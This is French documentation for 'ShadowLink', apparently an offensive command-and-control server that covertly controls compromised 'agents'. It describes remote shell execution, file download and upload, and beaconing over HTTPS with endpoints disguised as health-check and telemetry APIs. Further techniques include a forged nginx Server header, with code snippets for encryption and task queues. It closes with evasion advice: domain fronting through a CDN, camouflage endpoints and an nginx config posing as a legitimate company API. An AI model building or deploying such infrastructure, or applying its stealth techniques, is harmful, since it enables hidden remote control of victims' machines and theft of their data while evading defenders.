# 🖧 ShadowLink Server - Documentation Technique

## Vue d'ensemble

Le serveur ShadowLink est un serveur C2 (Command & Control) multi-agent écrit en Python qui permet de contrôler plusieurs agents simultanément. **Phase 11** introduit un serveur HTTPS avec communications chiffrées TLS et endpoints REST déguisés.

---

## 📋 Caractéristiques Techniques

### Serveur Legacy (TCP)

| Propriété | Valeur |
|-----------|--------|
| Fichier | `server/server.py` |
| Langage | Python 3.8+ |
| Protocole | TCP |
| Port par défaut | 4444 |
| Chiffrement | AES-256-CBC |
| Multi-threading | Oui |
| Multi-agent | Oui |

### Serveur HTTPS (Phase 11) ⭐

| Propriété | Valeur |
|-----------|--------|
| Fichier | `server/server_https.py` |
| Langage | Python 3.8+ |
| Protocole | HTTPS (TLS 1.2+) |
| Port par défaut | 443 |
| Chiffrement | TLS + AES-256-CBC |
| Framework | http.server + ssl |
| Architecture | REST API |
| Multi-agent | Oui (task queues) |

---

## 🏗️ Architecture

### Serveur HTTPS (Recommandé)

```
server_https.py
├── Configuration
│   ├── HTTPS_HOST / HTTPS_PORT
│   ├── AES_KEY (32 bytes)
│   └── SSL Context (TLS)
│
├── Chiffrement
│   ├── aes_encrypt() / aes_decrypt()
│   ├── encrypt_response() (AES + Base64)
│   └── decrypt_request() (Base64 + AES)
│
├── Gestion des Agents
│   ├── agents = {}          # Agent info storage
│   ├── agents_lock          # Thread-safe access
│   └── Agent metadata:
│       ├── hostname, username, os, arch
│       ├── pid, integrity, version
│       └── last_seen, ip
│
├── Task Management
│   ├── task_queues = {}     # Per-agent queues
│   ├── task_results = {}    # Task outputs
│   ├── create_task()
│   ├── get_task()
│   └── store_result()
│
├── HTTP Handler (C2Handler)
│   ├── do_GET()
│   │   ├── /api/v1/updates  → Get next task
│   │   └── /api/v1/download → File download
│   │
│   └── do_POST()
│       ├── /api/v1/status   → Agent check-in
│       ├── /api/v1/telemetry → Task results
│       └── /api/v1/upload   → File upload
│
├── SSL/TLS
│   ├── generate_self_signed_cert()
│   └── ssl.SSLContext()
│
└── CLI Interface
    └── cli_thread() [Daemon]
```

### Serveur TCP Legacy

```
server.py
├── Configuration
│   ├── AES_KEY
│   ├── HOST / PORT
│   └── RECV_BUFFER / FILE_CHUNK_SIZE
│
├── Chiffrement
│   ├── aes_encrypt()
│   └── aes_decrypt()
│
├── Gestion des Agents
│   ├── agents = {}
│   ├── agents_lock
│   ├── add_agent() / remove_agent()
│   └── list_agents()
│
├── File Transfer
│   ├── download_file_from_agent()
│   └── upload_file_to_agent()
│
├── Threading
│   └── accept_connections()
│
└── Main Loop
    └── Command prompt loop
```

---

## 🌐 Endpoints HTTPS (Phase 11)

### API REST déguisée

Les endpoints sont conçus pour ressembler à une API légitime :

| Endpoint | Méthode | Description | Apparence |
|----------|---------|-------------|-----------|
| `/api/v1/status` | POST | Check-in de l'agent | Health check API |
| `/api/v1/updates` | GET | Récupérer tâche | Software update check |
| `/api/v1/telemetry` | POST | Résultat de tâche | Telemetry upload |
| `/api/v1/upload` | POST | Upload fichier | File upload API |
| `/api/v1/download` | GET | Download fichier | File download API |

### Flux de communication

```
┌─────────────┐                              ┌─────────────┐
│    AGENT    │                              │   SERVER    │
└──────┬──────┘                              └──────┬──────┘
       │                                            │
       │  POST /api/v1/status                       │
       │  {hostname, username, os, arch, pid}       │
       │ ──────────────────────────────────────────►│
       │                                            │  Register/Update
       │◄──────────────────────────────────────────│  agent
       │  {status: "ok", agent_id: "xxx"}          │
       │                                            │
       │  ... beacon interval (5-15s) ...          │
       │                                            │
       │  GET /api/v1/updates                       │
       │  X-Client-ID: agent_id                     │
       │ ──────────────────────────────────────────►│
       │                                            │  Check task queue
       │◄──────────────────────────────────────────│
       │  "NOTASK" ou "123:whoami"                 │
       │                                            │
       │  POST /api/v1/telemetry                    │
       │  {task_id, status, output}                 │
       │ ──────────────────────────────────────────►│
       │                                            │  Store result
       │◄──────────────────────────────────────────│
       │  {status: "received"}                     │
       │                                            │
```

---

## 🔐 Chiffrement

### Double couche de chiffrement (Phase 11)

```
┌─────────────────────────────────────────────────────────────┐
│                 HTTPS (TLS 1.2+)                            │
│  ┌───────────────────────────────────────────────────────┐  │
│  │              AES-256-CBC + Base64                     │  │
│  │  ┌─────────────────────────────────────────────────┐  │  │
│  │  │           Données JSON (plaintext)              │  │  │
│  │  └─────────────────────────────────────────────────┘  │  │
│  └───────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────┘
```

### Fonctions de chiffrement

```python
def aes_encrypt(data: bytes) -> bytes:
    """Chiffre les données avec AES-256-CBC"""
    iv = get_random_bytes(16)
    cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
    padded_data = pad(data, AES.block_size)
    encrypted = cipher.encrypt(padded_data)
    return iv + encrypted

def encrypt_response(data: str) -> str:
    """Chiffre et encode en Base64 pour HTTP"""
    encrypted = aes_encrypt(data.encode('utf-8'))
    return base64.b64encode(encrypted).decode('utf-8')

def decrypt_request(data: str) -> str:
    """Décode Base64 et déchiffre"""
    decoded = base64.b64decode(data)
    decrypted = aes_decrypt(decoded)
    return decrypted.decode('utf-8')
```

---

## 📋 Task Queue System

### Architecture asynchrone

Le serveur HTTPS utilise un système de files d'attente pour gérer les commandes :

```python
# Créer une tâche pour un agent
task_id = create_task(agent_id, "whoami")
# task_id = 1

# L'agent récupère la tâche au prochain beacon
task = get_task(agent_id)
# task = {"id": 1, "command": "whoami", "created": datetime}

# L'agent renvoie le résultat
store_result(task_id, {"status": 0, "output": "DESKTOP\\User"})
```

### Avantages

| Aspect | Avantage |
|--------|----------|
| **Asynchrone** | L'opérateur n'attend pas, les tâches sont queued |
| **Résilient** | Les commandes survivent aux déconnexions |
| **Discret** | Traffic ressemble à des health checks périodiques |
| **Scalable** | Chaque agent a sa propre queue |

---

## 🔒 Certificats SSL

### Génération automatique

```python
def generate_self_signed_cert(cert_file: str, key_file: str):
    """Génère un certificat auto-signé si absent"""
    if os.path.exists(cert_file) and os.path.exists(key_file):
        return
    
    os.system(f'openssl req -x509 -newkey rsa:4096 '
              f'-keyout {key_file} -out {cert_file} '
              f'-days 365 -nodes -subj "/CN=localhost"')
```

### Génération manuelle

```bash
# Avec Makefile
make certs

# Manuellement
openssl req -x509 -newkey rsa:4096 \
    -keyout server/server.key \
    -out server/server.crt \
    -days 365 -nodes \
    -subj "/CN=your-domain.com"
```

### Structure des fichiers

```
server/
├── server.py           # Serveur TCP legacy
├── server_https.py     # Serveur HTTPS (Phase 11)
├── requirements.txt    # Dépendances Python
└── certs/              # (créé automatiquement)
    ├── server.crt      # Certificat
    └── server.key      # Clé privée
```

---

## 📡 Headers HTTP Falsifiés

Le serveur envoie des headers qui ressemblent à un serveur web légitime :

```python
self.send_header('Server', 'nginx/1.18.0')  # Fake server
self.send_header('X-Request-ID', os.urandom(8).hex())  # Request tracking
self.send_header('Content-Type', 'application/octet-stream')
```

---

## 💻 Interface Utilisateur

### Prompt

```
# Sans agent sélectionné
[HTTPS]> 

# Avec agent sélectionné
[HTTPS:abc123]> 
```

### Commandes Serveur

| Commande | Description |
|----------|-------------|
| `help` / `?` | Affiche l'aide |
| `agents` / `list` | Liste les agents connectés |
| `select <id>` | Sélectionne un agent |
| `deselect` | Désélectionne l'agent |
| `results` | Affiche les résultats des tâches |
| `quit` / `exit` | Arrête le serveur |

### Commandes Agent

| Commande | Description |
|----------|-------------|
| `shell <cmd>` | Exécute une commande shell |
| `download <path>` | Télécharge un fichier |
| `upload <path>` | Upload un fichier |
| `<any command>` | Queue la commande pour l'agent |

### Affichage des agents

```
╔════════════════════════════════════════════════════════════════╗
║                      CONNECTED AGENTS                          ║
╠════════════════╦═══════════════╦══════════════╦════════════════╣
║    Agent ID    ║    Hostname   ║    User      ║   Last Seen    ║
╠════════════════╬═══════════════╬══════════════╬════════════════╣
║ *abc123def     ║ DESKTOP-PC    ║ Admin        ║ 10:30:45       ║
║  xyz789abc     ║ LAPTOP-01     ║ User         ║ 10:29:12       ║
╚════════════════╩═══════════════╩══════════════╩════════════════╝
  * = selected agent
```

---

## 🚀 Démarrage

### Serveur HTTPS (Recommandé)

```bash
# Installation des dépendances
pip install flask pycryptodome

# Lancement
python server/server_https.py

# Ou avec Makefile
make server-https
```

### Sortie attendue

```
╔══════════════════════════════════════════════════════════════╗
║           SHADOWLINK HTTPS C2 SERVER - Phase 11              ║
║                 Stealth Communications                       ║
╚══════════════════════════════════════════════════════════════╝

[*] Generating self-signed certificate...
[+] HTTPS server running on https://0.0.0.0:443

[*] Type 'help' for available commands

[HTTPS]> 
```

### Serveur TCP Legacy

```bash
python server/server.py

# Ou avec Makefile
make server
```

---

## 📂 Fichiers Générés

### Structure

```
ShadowLink/
├── downloads/              # Fichiers téléchargés depuis agents
│   └── 20241201_103000_hosts
├── uploads/                # Fichiers à envoyer aux agents
├── certs/                  # Certificats SSL
│   ├── server.crt
│   └── server.key
└── reports/                # Rapports de recon (legacy)
    └── recon_192.168.1.100_20241201.txt
```

---

## 🔄 Comparaison TCP vs HTTPS

| Aspect | TCP (Legacy) | HTTPS (Phase 11) |
|--------|--------------|------------------|
| **Port** | 4444 (suspect) | 443 (standard) |
| **Protocole** | TCP brut | HTTPS REST |
| **Chiffrement** | AES-256 | TLS + AES-256 |
| **Détection** | Facile (port 4444) | Difficile |
| **Firewall** | Souvent bloqué | Généralement autorisé |
| **Inspection** | Pattern matching | Traffic légitime |
| **Architecture** | Synchrone | Task queue async |
| **Beacon** | Connexion permanente | Polling périodique |

---

## ⚠️ Limitations Connues

### Serveur HTTPS

1. **Certificat auto-signé** - Génère des alertes SSL
2. **Pas d'authentification mutuelle** - Agent non vérifié
3. **Jitter fixe** - Beacon interval prévisible
4. **Pas de Domain Fronting** - IP visible
5. **Pas de Malleable C2** - Profil fixe

### Serveur TCP (Legacy)

1. **Port 4444** - Connu et filtré
2. **Pas de TLS** - Traffic analysable
3. **Connexion permanente** - Pattern détectable
4. **Single-threaded commands** - Une commande à la fois

---

## 🔒 Sécurité

### Thread Safety

```python
agents_lock = threading.Lock()
task_lock = threading.Lock()

with agents_lock:
    agents[agent_id] = {...}

with task_lock:
    task_results[task_id] = {...}
```

### Fermeture propre

```python
try:
    server.serve_forever()
except KeyboardInterrupt:
    print("[*] Server stopped")
```

---

## 📚 Dépendances

### requirements.txt

```
pycryptodome>=3.9.0
flask>=2.0.0
```

### Installation

```bash
pip install -r server/requirements.txt
```

---

## 🛡️ Recommandations de déploiement

### Pour un déploiement réaliste

1. **Utiliser un vrai certificat** (Let's Encrypt)
2. **Configurer un reverse proxy** (nginx)
3. **Utiliser un CDN** pour domain fronting
4. **Randomiser les endpoints** 
5. **Implémenter le jitter variable**
6. **Ajouter de faux endpoints** pour le camouflage

```nginx
# Exemple nginx reverse proxy
server {
    listen 443 ssl;
    server_name api.legit-company.com;
    
    ssl_certificate /path/to/cert.pem;
    ssl_certificate_key /path/to/key.pem;
    
    location /api/v1/ {
        proxy_pass http://127.0.0.1:8443;
    }
    
    # Fake endpoints for camouflage
    location / {
        return 200 '{"status": "healthy"}';
    }
}
```
